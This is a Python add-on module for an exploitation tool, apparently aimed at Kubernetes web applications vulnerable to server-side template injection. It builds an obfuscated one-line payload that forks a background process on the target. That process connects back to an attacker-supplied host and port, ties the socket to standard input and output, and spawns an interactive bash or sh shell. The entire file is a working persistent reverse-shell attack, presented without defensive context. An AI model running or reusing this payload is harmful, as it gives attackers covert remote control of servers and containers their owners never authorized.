import json

def run(exploit, params=None):
    G, R, Y, B, C, M, N = "\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[96m", "\033[95m", "\033[0m"
    
    if not params or len(params) < 2:
        print(f" {R}!!{N} Usage: --addon shell <LHOST> <LPORT>")
        return

    lhost, lport = params[0], params[1]
    print(f"\n{B}[ K8S EXPLOIT: PERSISTENT BACKGROUND SHELL ]{N}")
    print(f" {G}●{N} Target Listener: {Y}{lhost}:{lport}{N}")

    # THE PAYLOAD:
    # 1. We use os.fork(). 
    # 2. If fork returns > 0 (Parent), we return 'Backgrounded' to satisfy the SSTI.
    # 3. If fork returns 0 (Child), we disconnect from the web server and start the PTY shell.
    shell_py = (
        f"(lambda i: (lambda s, os: "
        f" (os.fork() and 'Backgrounded') or " # Parent returns string and exits
        f" (os.setsid(), "                     # Child creates new session
        f"  s.connect(('{lhost}', {int(lport)})), "
        f"  [os.dup2(s.fileno(), f) for f in (0,1,2)], "
        f"  i('pty').spawn('/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'))"
        f")"
        f"(i('socket').socket(i('socket').AF_INET, i('socket').SOCK_STREAM), i('os'))"
        f")(__import__)"
    )

    print(f" {Y}[*] Sending background fork payload...{N}")
    result = exploit.execute(shell_py)
    
    # Check if the server returned our 'Backgrounded' success string
    if "Backgrounded" in result:
        print(f" {G}●{N} {G}SUCCESS{N}: Process forked on target container.")
        print(f" {G}●{N} Your local script is now free. Check your listener tab!")
    else:
        print(f" {R}!!{N} Dispatch failed or returned unexpected data: {result[:200]}")

    print(f"\n{B}[ Operation Complete ]{N}\n")